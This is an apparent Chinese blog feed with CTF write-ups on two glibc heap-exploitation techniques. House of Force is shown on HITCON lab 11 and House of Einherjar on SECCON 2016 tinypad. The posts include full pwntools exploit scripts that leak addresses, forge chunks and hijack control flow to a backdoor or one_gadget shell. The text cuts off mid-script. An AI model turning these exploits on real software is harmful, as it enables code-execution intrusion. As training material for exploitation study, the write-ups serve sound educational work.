        <content type="html"><![CDATA[<h1 id="House-force-HITCON-training-lab-11"><a href="#House-force-HITCON-training-lab-11" class="headerlink" title="House_force(HITCON training lab 11)"></a>House_force(HITCON training lab 11)</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Force是一种堆利用方法，一个堆想要通过House of Force利用需要以下条件</p><ul><li>topchunk的size域可以控制</li><li>能够自由控制堆分配的大小</li></ul><p>我们知道进行堆分配的时候，如果空闲块无法满足需求，就会从top chunk中分割出对应大小的堆块空间</p><p>下面是glibc对top chunk的验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果我们可以把size域改成一个非常大的数就可以进入这个if语句，一半把大小改成-1即可</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">remainder</span>      = chunk_at_offset(victim, nb);<br><span class="hljs-built_in">av</span>-&gt;top        = <span class="hljs-built_in">remainder</span>;<br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br>#<span class="hljs-built_in">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))<br><br></code></pre></td></tr></table></figure><p>这里会把top指针重新根据申请堆块的大小重新分配，如果我们能够控制这个remiander,就能实现地址任意写</p><p>于此同时，topchunk的size域也会更新，更新方法如下</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coq">victim = av-&gt;<span class="hljs-built_in">top</span>;<br>size   = chunksize(victim);<br>remainder_size = size - nb;<br>set_head(remainder, remainder_size | <span class="hljs-type">PREV_INUSE</span>);<br></code></pre></td></tr></table></figure><p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><h2 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a>HITCON training lab 11</h2><h3 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h3><p><img src="/img/house-force/a"></p><p>这是一个打印函数，很正常，没什么好说的</p><h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><p><img src="/img/house-force/b"></p><p>这是创建堆块的函数，输入大小和内容创建，并把堆块指针存在unk_6020c8</p><h3 id="chang函数"><a href="#chang函数" class="headerlink" title="chang函数"></a>chang函数</h3><p><img src="/img/house-force/c"></p><p>这是一个对已有堆块的编辑函数，可以看到这里可以重新输入编辑内容的大小，存在堆溢出漏洞</p><h3 id="remove函数"><a href="#remove函数" class="headerlink" title="remove函数"></a>remove函数</h3><p><img src="/img/house-force/d"></p><p>这是一个堆块的释放函数，删的很干净，什么也没留下</p><h3 id="goobye-message"><a href="#goobye-message" class="headerlink" title="goobye_message"></a>goobye_message</h3><p><img src="/img/house-force/e"></p><p>这是在退出循环后执行的函数，会执行两句话</p><h3 id="magic函数"><a href="#magic函数" class="headerlink" title="magic函数"></a>magic函数</h3><p><img src="/img/house-force/f"></p><p>这里给了一个后门</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为存在堆溢出，可以覆盖top_chunk的size域，并且malloc分配可以自由控制大小，那么我们就可以进行house_force</p><p>首先先溢出覆盖size域</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot;ddaa&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x41</span>,payload)<br></code></pre></td></tr></table></figure><p><img src="/img/house-force/g"></p><p>在程序中，专门为goobye_message函数和hello_message函数创建了一个堆来存放函数地址</p><p><img src="/img/house-force/h"></p><p><img src="/img/house-force/i"></p><p>因为goobye_message是在程序退出后执行，那么思路就有了，如果把这两个地址覆盖成后门地址，那程序的最后执行的就是拿flag的函数</p><p>接着就是把top_chunk的指针指向0x95700</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">offest=-(<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span>)<br>malloc_size=offest-<span class="hljs-number">0x10</span><br>add(malloc_size,<span class="hljs-string">&quot;daad&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>因为正常的申请后top_chunk指针的变化是这样的</p><p>top_chunk&#x3D;原top_chunk+申请大小+0x10(pre_size和size),那么要把top_chunk指针往前走，自然要-0x10</p><p><img src="/img/house-force/j"></p><p>可以看到此时的top_chunk指向了0x95700,大小为0x58,那么我们申请一个小于0x58大小的chunk就可以对覆盖掉两个message函数的指针了</p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./bamboobox&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/home/joker/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>io.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;Please enter the name of item:&quot;</span>)<br>io.send(name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">idx,size,name</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;Please enter the new name of the item:&quot;</span>)<br>io.send(name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(idx))<br>magic=<span class="hljs-number">0x400d49</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot;ddaa&quot;</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x41</span>,payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>offest=-(<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span>)<br>malloc_size=offest-<span class="hljs-number">0x10</span><br>add(malloc_size,<span class="hljs-string">&quot;daad&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br>io.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#hitcon-training-lab-11">ctfwiki-House Of Force</a></p><p><a href="https://blog.csdn.net/qq_45595732/article/details/110181293">House Of Force</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> House </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_of_Einherjar(2016 Seccon tinypad)</title>
      <link href="/2024/11/15/House-of-Einherjar/"/>
      <url>/2024/11/15/House-of-Einherjar/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Einherjar-2016-Seccon-tinypad"><a href="#House-of-Einherjar-2016-Seccon-tinypad" class="headerlink" title="House_of_Einherjar(2016 Seccon tinypad)"></a>House_of_Einherjar(2016 Seccon tinypad)</h1><h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>这种结束与之前的堆块利用有一些区别，该技术可以强制使得malloc返回几乎任意地址的chunk,可以说非常强大，他的原理跟chunk_overlapping 类似，在之前的堆利用中我们都要避免与top_chunk合并，而这个技术也可以与top_chunk合并进行利用，这里给的例子只是任意地址chunk的利用</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="free-函数向后合并"><a href="#free-函数向后合并" class="headerlink" title="free()函数向后合并"></a>free()函数向后合并</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>prevsize = prev_size(p);<br>size += prevsize;<br>p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>unlink(av, p, bck, fwd);<br>&#125;<br></code></pre></td></tr></table></figure><p>解释一下这个这段代码：</p><ul><li>判断被释放堆块p的inuse域是否为0，如果为0则执行if里面的代码</li><li>记录相邻堆块的大小，即pre_size域</li><li>size为size + prev_size</li><li>最后堆块p的指针由chunk_at_offset函数决定</li><li>最后unlink检查</li><li>chunk_at_offset函数代码，可以看到最后堆块的指针就是原本的指针减上presize上的偏移</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure><h3 id="与top-chunk合并"><a href="#与top-chunk合并" class="headerlink" title="与top_chunk合并"></a>与top_chunk合并</h3><p>当释放堆块紧邻top_chunk时，释放后会与top_chunk进行合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> &#123;<br>size += nextsize;<br>set_head(p, size | PREV_INUSE);<br>av-&gt;top = p;<br>check_chunk(av, p);<br>&#125;<br>*******************************************************<br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s) (((p)-&gt;size = (s)))</span><br></code></pre></td></tr></table></figure><p>可以看到执行set_head()函数后，合并堆块的size会变为两个堆块的总和，并且top_chunk的指针会指向被合并的堆块p的位置。就相当于top_chunk把p给吞了，并取代了p的位置</p><h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><p><img src="/img/House-of-Einherjar/a"></p><p>这段代码写的有点乱，但是总的功能就是输入大小，内容创建一个memo,并且这个内容是实时打印出来的，这个memo的指针存在数组tinypad中</p><p><img src="/img/House-of-Einherjar/b"></p><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><p><img src="/img/House-of-Einherjar/c"></p><p>这段代码的意思是输入要编辑的memo，然后输入内容，要注意的是，它并不是直接把内容输入对应chunk的data域，而是用tinypad数组过渡，然后用strcpy函数cpoy过去</p><p>但是实际上里面的自定义read函数是存在off_by_one漏洞的</p><p><img src="/img/House-of-Einherjar/d"></p><p>可以看到循环结束后会在末尾多加一个0形成off_by_null</p><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><p><img src="/img/House-of-Einherjar/e"></p><p>这个delete函数就是输入对应的memo，然后释放，但是它也仅仅是释放，并没有把内容置零，更没有把指针置零，指针没有置零意味着我们可以重复使用。而释放后挂入bin后，其bk，fd指针是敏感信息，我们可以进行泄露</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="泄露heap地址和libc地址"><a href="#泄露heap地址和libc地址" class="headerlink" title="泄露heap地址和libc地址"></a>泄露heap地址和libc地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x80</span>)  <span class="hljs-comment">#chunk1</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x80</span>)  <span class="hljs-comment">#chunk2</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">0x80</span>)  <span class="hljs-comment">#chunk3  </span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x80</span>)  <span class="hljs-comment">#chunk4</span><br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这里利用unsortedbin的双链表机制，chunk1的fd指针会指向chunk3,而chunk3的fd指针会指向main_arena+88</p><p><img src="/img/House-of-Einherjar/f"></p><p>由于程序会实时打印内容，而此时的内容已经变成了我们要泄露的地址了，可以直接接收</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">p.recvuntil(<span class="hljs-string">&quot; #   INDEX: 1\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot; # CONTENT: &quot;</span>)<br>heap = u64(p.recvline().rstrip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x120</span><br>log.info(<span class="hljs-string">&quot;heap_base: %s&quot;</span> % <span class="hljs-built_in">hex</span>(heap))<br>p.recvuntil(<span class="hljs-string">&quot; #   INDEX: 3\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot; # CONTENT: &quot;</span>)<br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x58</span><br>log.info(<span class="hljs-string">&quot;main_arena: %s&quot;</span> % <span class="hljs-built_in">hex</span>(main_arena))<br></code></pre></td></tr></table></figure><h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House_of_Einherjar"></a>House_of_Einherjar</h3><p>因为我们chunk的指针就存在tinypad数组中，所以我们伪造的fake_chunk就是tinypad</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span>x18)</span></span>  <br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100, b<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0</span>xf8 + p64(<span class="hljs-number">0</span>x11)</span></span>)  <span class="hljs-selector-id">#chunk2</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100, <span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">0</span>xf8)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0</span>xf8)</span></span><br></code></pre></td></tr></table></figure><p>我打算通过free chunk2来利用tinypad</p><ul><li>那么首先就是要让chunk2的inuse域为0，也就是在申请chunk1时把内容填满即可</li><li>第二步要把chunk2的presize域变成 chunk2_addr-fake_chunk</li><li>第三步伪造fake_chunk,来绕过free函数的unlink检查</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x18</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0xf8</span> + p64(<span class="hljs-number">0x11</span>))<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x100</span>)<br><br>tinypad = <span class="hljs-number">0x602040</span><br>offset = heap + <span class="hljs-number">0x20</span> - <span class="hljs-number">0x602040</span> - <span class="hljs-number">0x20</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(<span class="hljs-number">0x602060</span>) * <span class="hljs-number">2</span><br><br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x20</span> + fake_chunk)<br>zero_byte_number = <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(p64(offset).strip(<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">循环edit的原因是stcpy()会因为空子节而停止copy, 但每次读取都会将最后一个字节变为NULL, 这样就可以用NULL逐一覆盖, 使2号chunk的prev_size为offset</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(zero_byte_number+<span class="hljs-number">1</span>):<br>  data = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x10</span> + p64(offset).strip(<span class="hljs-string">&quot;\x00&quot;</span>).rjust(<span class="hljs-number">8</span>-i, <span class="hljs-string">&#x27;f&#x27;</span>)<br>  edit(<span class="hljs-number">1</span>, data)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(main_arena + <span class="hljs-number">0x58</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment">#修复unsorted bin</span><br></code></pre></td></tr></table></figure><p>为什么要用循环一个字节一个字节 的覆盖chunk2的pre_size域呢？因为我们要的效果是向下面这样的</p><p><img src="/img/House-of-Einherjar/g"></p><p>而我们如果直接输入的话，strcpy函数遇到\x00是会停止复制的，也就会造成下面的效果</p><p><img src="/img/House-of-Einherjar/h"></p><p>没法伪造pre_size域的同时，inuse域也无法置0</p><p>而上面的代码中</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">edit(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x20</span> + fake_chunk)<br></code></pre></td></tr></table></figure><p>这一段实际上并没有把fake_chunk写进memo3,而是写进了tinypad中，还记得上面我们分析函数的时候，这个编辑会用这个数组过渡，而strcpy函数遇到0会停止copy,这就是在伪造fake_chunk绕过unlink检查</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">edit(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(main_arena + <span class="hljs-number">0x58</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment">#修复unsorted bin</span><br></code></pre></td></tr></table></figure><p>这一行代码是为了修复unsortedbin 链的，当fake_chunk被挂进unsortedbin后，此时链表中只有它一个，那么他的fd指针和bk指针都应该指向main_arena+88的地方，然后才可以正常申请，最后利用就如下图</p><p><img src="/img/House-of-Einherjar/i"></p><h3 id="更改返回地址为onegadget"><a href="#更改返回地址为onegadget" class="headerlink" title="更改返回地址为onegadget"></a>更改返回地址为onegadget</h3><p>这一步就是很常规的拿shell的部分了，我就步仔细说了，代码如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0xd0</span> + p64(<span class="hljs-number">0x18</span>) + p64(environ_pointer) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0x602148</span>))<br>p.recvuntil(<span class="hljs-string">&quot; #   INDEX: 1\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot; # CONTENT: &quot;</span>)<br>main_ret = u64(p.recvline().rstrip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x8</span>*<span class="hljs-number">30</span><br>log.info(<span class="hljs-string">&quot;environ_addr: %s&quot;</span> % <span class="hljs-built_in">hex</span>(main_ret))<br>edit(<span class="hljs-number">2</span>, p64(main_ret))<br>edit(<span class="hljs-number">1</span>, p64(one_gadget))<br>p.sendline(<span class="hljs-string">&#x27;Q&#x27;</span>)<br><span class="hljs-comment">#p.recvall()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./tinypad&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-1.so.6&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;(SIZE)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span 